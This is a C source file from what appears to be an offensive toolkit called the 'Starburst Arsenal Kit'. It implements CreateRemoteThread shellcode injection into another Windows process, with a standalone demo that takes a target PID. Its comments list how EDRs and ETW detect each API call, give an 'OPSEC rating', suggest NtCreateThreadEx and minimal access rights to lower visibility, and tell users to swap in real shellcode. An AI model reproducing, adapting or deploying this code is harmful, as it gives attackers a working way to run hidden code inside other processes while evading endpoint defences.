/*
 * inject_crt.c - CreateRemoteThread Injection (Baseline)
 *
 * Starburst Arsenal Kit - Injection Techniques
 * =============================================
 *
 * TECHNIQUE: Classic CreateRemoteThread
 *
 * This is the baseline injection technique that Starburst currently uses.
 * It is provided here as a reference implementation for comparison with
 * the more advanced techniques in this kit.
 *
 * FLOW:
 *   1. OpenProcess (PROCESS_ALL_ACCESS)
 *   2. VirtualAllocEx (RW) - allocate memory in target
 *   3. WriteProcessMemory - copy shellcode
 *   4. VirtualProtectEx (RX) - flip to executable
 *   5. CreateRemoteThread - execute shellcode
 *   6. Wait + cleanup
 *
 * OPSEC RATING: LOW
 *
 *   This technique is the most detected injection method. Every major
 *   EDR hooks and monitors the API calls used here. It should only be
 *   used as a fallback or in environments with no endpoint protection.
 *
 * DETECTION SURFACE:
 *   - ETW: Microsoft-Windows-Threat-Intelligence
 *       * EtwTiVirtualAllocEx (remote allocation)
 *       * EtwTiWriteVirtualMemory (cross-process write)
 *       * EtwTiProtectVirtualMemory (protection change)
 *   - Kernel callbacks:
 *       * PsSetCreateThreadNotifyRoutineEx (remote thread creation)
 *       * ObRegisterCallbacks (process handle with VM rights)
 *   - User-mode hooks (most EDRs):
 *       * OpenProcess - cross-process handle acquisition
 *       * VirtualAllocEx - remote memory allocation
 *       * WriteProcessMemory - cross-process memory write
 *       * CreateRemoteThread - remote thread spawn
 *   - Behavioral:
 *       * Unsigned process opening a signed process with VM rights
 *       * RW -> RX memory protection transition in remote process
 *       * Thread start address in unbacked (private) memory
 *
 * MONITORED API CALLS:
 *   OpenProcess, VirtualAllocEx, WriteProcessMemory,
 *   VirtualProtectEx, CreateRemoteThread
 *
 * PROS:
 *   - Simple and reliable
 *   - Works on all Windows versions
 *   - Easy to understand and debug
 *
 * CONS:
 *   - Every EDR detects this pattern
 *   - CreateRemoteThread is the #1 injection indicator
 *   - Thread starts from unbacked (private) memory
 *   - Multiple suspicious API calls in sequence
 *
 * ADAPTING FOR STARBURST PIC (Stardust framework):
 *   - Replace GetModuleHandleA/GetProcAddress with LdrModule/LdrFunction
 *   - Replace printf/fprintf with Stardust logging or remove
 *   - All Win32 calls already used in cmd_shinject.cc
 *   - Consider replacing CreateRemoteThread with NtCreateThreadEx
 *     for slightly less visibility (still detected, but avoids
 *     the kernel32 hook layer)
 *
 * COMPILE:
 *   cl.exe /W4 /O2 inject_crt.c /Fe:inject_crt.exe
 *   or
 *   x86_64-w64-mingw32-gcc -O2 -Wall inject_crt.c -o inject_crt.exe
 */

#include <windows.h>
#include <stdio.h>
#include "../include/injection.h"

/*
 * inject - Perform CreateRemoteThread injection into a target process.
 *
 * Parameters:
 *   pid           - Target process ID
 *   shellcode     - Pointer to shellcode buffer
 *   shellcode_len - Size of shellcode in bytes
 *
 * Returns:
 *   TRUE on success, FALSE on failure.
 *
 * Notes:
 *   Memory is allocated as RW, written, then flipped to RX.
 *   This two-step approach avoids allocating RWX memory directly,
 *   which is an even stronger detection signal.
 */
BOOL inject(DWORD pid, LPVOID shellcode, SIZE_T shellcode_len) {
    HANDLE hProcess     = NULL;
    HANDLE hThread      = NULL;
    LPVOID remoteBuffer = NULL;
    DWORD  oldProtect   = 0;
    BOOL   result       = FALSE;

    /* --------------------------------------------------------
     * Step 1: Open target process with full access
     *
     * Required rights:
     *   PROCESS_CREATE_THREAD  - for CreateRemoteThread
     *   PROCESS_VM_OPERATION   - for VirtualAllocEx / VirtualProtectEx
     *   PROCESS_VM_WRITE       - for WriteProcessMemory
     *   PROCESS_QUERY_INFORMATION - for thread creation
     *
     * Using PROCESS_ALL_ACCESS for simplicity. In production,
     * use minimum required rights to reduce detection surface.
     * -------------------------------------------------------- */
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        fprintf(stderr, "[!] OpenProcess failed: %lu\n", GetLastError());
        goto cleanup;
    }
    fprintf(stderr, "[+] Opened process %lu (handle: 0x%p)\n", pid, hProcess);

    /* --------------------------------------------------------
     * Step 2: Allocate RW memory in the target process
     *
     * Allocating as PAGE_READWRITE first, then flipping to
     * PAGE_EXECUTE_READ after writing. This avoids the
     * PAGE_EXECUTE_READWRITE allocation which is a stronger
     * indicator of malicious activity.
     * -------------------------------------------------------- */
    remoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        shellcode_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!remoteBuffer) {
        fprintf(stderr, "[!] VirtualAllocEx failed: %lu\n", GetLastError());
        goto cleanup;
    }
    fprintf(stderr, "[+] Allocated %zu bytes at 0x%p in target\n",
            shellcode_len, remoteBuffer);

    /* --------------------------------------------------------
     * Step 3: Write shellcode to the allocated memory
     * -------------------------------------------------------- */
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode,
                            shellcode_len, &bytesWritten)) {
        fprintf(stderr, "[!] WriteProcessMemory failed: %lu\n", GetLastError());
        goto cleanup;
    }
    if (bytesWritten != shellcode_len) {
        fprintf(stderr, "[!] Partial write: %zu / %zu bytes\n",
                bytesWritten, shellcode_len);
        goto cleanup;
    }
    fprintf(stderr, "[+] Wrote %zu bytes to target\n", bytesWritten);

    /* --------------------------------------------------------
     * Step 4: Change memory protection from RW to RX
     *
     * This transition (RW -> RX) is monitored by ETW
     * (EtwTiProtectVirtualMemory) and most EDRs. However, it
     * is less suspicious than allocating RWX directly.
     * -------------------------------------------------------- */
    if (!VirtualProtectEx(hProcess, remoteBuffer, shellcode_len,
                          PAGE_EXECUTE_READ, &oldProtect)) {
        fprintf(stderr, "[!] VirtualProtectEx failed: %lu\n", GetLastError());
        goto cleanup;
    }
    fprintf(stderr, "[+] Memory protection changed to RX\n");

    /* --------------------------------------------------------
     * Step 5: Create remote thread to execute shellcode
     *
     * CreateRemoteThread is the primary detection vector.
     * The kernel callback PsSetCreateThreadNotifyRoutineEx
     * fires for every new thread, and EDRs check whether the
     * start address is in legitimate (image-backed) memory.
     *
     * Thread start address in private (unbacked) memory is a
     * strong indicator of injection.
     * -------------------------------------------------------- */
    hThread = CreateRemoteThread(
        hProcess,
        NULL,           /* default security */
        0,              /* default stack size */
        (LPTHREAD_START_ROUTINE)remoteBuffer,
        NULL,           /* no parameter */
        0,              /* run immediately */
        NULL            /* don't need thread ID */
    );
    if (!hThread) {
        fprintf(stderr, "[!] CreateRemoteThread failed: %lu\n", GetLastError());
        goto cleanup;
    }
    fprintf(stderr, "[+] Created remote thread (handle: 0x%p)\n", hThread);

    /* Wait for thread to signal (shellcode execution started) */
    WaitForSingleObject(hThread, INFINITE);
    fprintf(stderr, "[+] Remote thread completed\n");

    result = TRUE;

cleanup:
    if (hThread)  CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);

    /*
     * NOTE: We intentionally do NOT free the remote allocation
     * because the shellcode may still be running (e.g., if it
     * spawned additional threads). In production, the shellcode
     * should handle its own cleanup or use a callback mechanism
     * to signal when it is safe to free.
     */

    return result;
}

/* ============================================================
 * Demo entry point
 *
 * Usage: inject_crt.exe <PID>
 *
 * Uses a placeholder NOP + INT3 shellcode for testing.
 * Replace with actual shellcode for real use.
 * ============================================================ */
#ifdef BUILD_STANDALONE
int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    DWORD pid = (DWORD)atoi(argv[1]);

    /* Placeholder shellcode: NOP sled + breakpoint (for testing) */
    unsigned char shellcode[] = {
        0x90, 0x90, 0x90, 0x90,  /* NOP NOP NOP NOP */
        0xCC                      /* INT3 (breakpoint) */
    };

    printf("[*] CreateRemoteThread injection\n");
    printf("[*] Target PID: %lu\n", pid);
    printf("[*] Shellcode size: %zu bytes\n", sizeof(shellcode));

    if (inject(pid, shellcode, sizeof(shellcode))) {
        printf("[+] Injection succeeded\n");
        return 0;
    } else {
        printf("[-] Injection failed\n");
        return 1;
    }
}
#endif
